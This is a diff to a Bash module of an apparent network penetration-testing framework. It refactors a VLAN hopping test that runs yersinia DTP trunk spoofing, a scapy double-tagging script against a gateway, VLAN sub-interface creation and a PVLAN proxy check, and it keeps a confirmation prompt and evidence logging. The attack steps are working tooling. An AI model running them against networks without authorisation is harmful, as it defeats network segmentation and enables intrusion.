@@ -36,10 +36,29 @@
 #    - trunk_negotiated: bool
 #===============================================================================
 
+set -uo pipefail
+
 run_c3() {
     set -uo pipefail
+
+    local interface=""
+    local evidence_dir="${SESSION_EVIDENCE_DIR:-}"
+
+    # Parse arguments
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --interface) interface="$2"; shift 2 ;;
+            --evidence-dir) evidence_dir="$2"; shift 2 ;;
+            *) shift ;;
+        esac
+    done
+
+    # Fallbacks to globals if not provided
+    interface="${interface:-${WIFI_INTERFACE:-wlan0}}"
+    evidence_dir="${evidence_dir:-${SESSION_EVIDENCE_DIR:-.}}"
+
     local total_steps=6
-    local evidence_prefix="${SESSION_EVIDENCE_DIR}/c3"
+    local evidence_prefix="${evidence_dir}/c3"
 
     #--- Step 1: Verify tools and prerequisites ---
     log_step 1 $total_steps "Verifying tools and loading B3 data"
@@ -59,16 +78,14 @@ run_c3() {
         log_warn "scapy not available — double-tagging test limited"
     fi
 
-        # Ensure monitor mode is globally disabled (we need to be connected)
+    # Ensure monitor mode is globally disabled (we need to be connected)
+    WIFI_INTERFACE="$interface"
     ensure_managed_mode || return 1
-
 
     if [[ -n "${MONITOR_INTERFACE:-}" ]]; then
         disable_monitor_mode
         sleep 3
     fi
-
-    local iface="${WIFI_INTERFACE:-wlan0}"
 
     # Load B3 data for native VLAN info
     local native_vlan=""
@@ -112,7 +129,11 @@ run_c3() {
     echo "  ╚════════════════════════════════════════════════════════════════════╝"
     echo -e "${C_RESET}"
     echo ""
-    get_or_request_param "confirm" "  Proceed with VLAN hopping tests? [Y/n]"
+    local confirm=""
+    stty echo 2>/dev/null
+    read -t 0.1 -n 10000 discard 2>/dev/null || true
+    printf "  Proceed with VLAN hopping tests? [Y/n]: "
+    read confirm
     [[ "${confirm,,}" == "n" ]] && return 1
 
     #--- Step 2: DTP Switch Spoofing ---
@@ -130,27 +151,27 @@ run_c3() {
         echo "============================================================"
         echo "  C3: DTP Switch Spoofing Test"
         echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
-        echo "  Interface: ${iface}"
+        echo "  Interface: ${interface}"
         echo "============================================================"
         echo ""
     } > "$dtp_file"
 
     # Start packet capture
-    spawn_bg "c3_tcpdump" "${TOOL_PATHS[tcpdump]}" -i "$iface" -w "$capture_file" "vlan or (ether[20:2] == 0x2004)"
+    spawn_bg "c3_tcpdump" "${TOOL_PATHS[tcpdump]}" -i "$interface" -w "$capture_file" "vlan or (ether[20:2] == 0x2004)"
 
     if [[ "$has_yersinia" == "true" ]]; then
-        log_cmd "${TOOL_PATHS[yersinia]} dtp -attack 1 -interface ${iface}"
+        log_cmd "${TOOL_PATHS[yersinia]} dtp -attack 1 -interface ${interface}"
         echo "Attempting DTP trunk negotiation via ${TOOL_PATHS[yersinia]}..." >> "$dtp_file"
 
         # Send DTP desirable frames
         start_countdown 30 "Sending DTP trunk negotiation frames"
-        timeout 30 "${TOOL_PATHS[yersinia]}" dtp -attack 1 -interface "$iface" >/dev/null 2>&1 || true
+        timeout 30 "${TOOL_PATHS[yersinia]}" dtp -attack 1 -interface "$interface" >/dev/null 2>&1 || true
         stop_countdown
 
         # Check if trunk was negotiated by looking for VLAN-tagged frames
         sleep 5
         local vlan_frames
-        vlan_frames=$(timeout 10 ${TOOL_PATHS[tcpdump]} -i "$iface" -c 5 "vlan" 2>/dev/null | wc -l) || true
+        vlan_frames=$(timeout 10 ${TOOL_PATHS[tcpdump]} -i "$interface" -c 5 "vlan" 2>/dev/null | wc -l) || true
 
         if [[ $vlan_frames -gt 0 ]]; then
             dtp_vulnerable="true"
@@ -168,6 +189,8 @@ run_c3() {
 
         # Check if any DTP frames were observed (from B3 or passively)
         if has_tc_results "B3"; then
+            local b3_data
+            b3_data=$(load_tc_result "B3")
             local dtp_count
             dtp_count=$(echo "$b3_data" | run_fg jq '.dtp_frames // 0')
             if [[ $dtp_count -gt 0 ]]; then
@@ -223,7 +246,7 @@ run_c3() {
 from scapy.all import *
 import sys
 
-iface = "${iface}"
+iface = "${interface}"
 outer_vlan = ${outer_vlan}
 inner_vlan = ${target_vlan}
 target = "${target_gw}"
@@ -270,10 +293,10 @@ SCAPY_EOF
         for target_vlan in "${target_vlans[@]}"; do
             check_abort || return 1
 
-            local vlan_iface="${iface}.${target_vlan}"
+            local vlan_iface="${interface}.${target_vlan}"
 
             # Try to create VLAN sub-interface
-            run_fg ip link add link "$iface" name "$vlan_iface" type vlan id "$target_vlan" 2>/dev/null || continue
+            run_fg ip link add link "$interface" name "$vlan_iface" type vlan id "$target_vlan" 2>/dev/null || continue
             run_fg ip link set "$vlan_iface" up 2>/dev/null || continue
             run_fg ip addr add "169.254.${RANDOM:0:2}.${RANDOM:0:2}/16" dev "$vlan_iface" 2>/dev/null || true
 
@@ -331,8 +354,9 @@ SCAPY_EOF
     check_abort || return 1
 
     # If we know the gateway, try to use it as a proxy to reach isolated hosts
+    local gateway_ip="${GATEWAY_IP:-}"
     local pvlan_vulnerable="false"
-    if [[ -n "$GATEWAY_IP" ]]; then
+    if [[ -n "$gateway_ip" ]]; then
         # The PVLAN proxy attack uses ARP manipulation to redirect traffic through the gateway
         # to reach hosts that should be isolated. This is a conceptual test.
         log_info "PVLAN proxy attack test: conceptual verification"
@@ -341,7 +365,7 @@ SCAPY_EOF
 
         # Check if IP forwarding is enabled on gateway (traceroute with TTL=1)
         local ttl_test
-        ttl_test=$(ping -c 1 -t 1 "$GATEWAY_IP" 2>&1 || true)
+        ttl_test=$(ping -c 1 -t 1 "$gateway_ip" 2>&1 || true)
         if echo "$ttl_test" | grep -q "Time to live exceeded"; then
             log_result "INFO" "Gateway forwards packets (TTL exceeded) — PVLAN proxy may be possible"
         fi
@@ -382,9 +406,9 @@ SCAPY_EOF
     fi
 
     local result_json
-    evidence_register_file "c3_dtp_attack.txt"
-    evidence_register_file "c3_double_tag_results.txt"
-    evidence_register_file "c3_vlan_hopping.pcap"
+    evidence_register_file "$dtp_file"
+    evidence_register_file "$double_tag_file"
+    evidence_register_file "$capture_file"
 
     result_json=$(run_fg jq -n \
         --arg status "$result_status" \
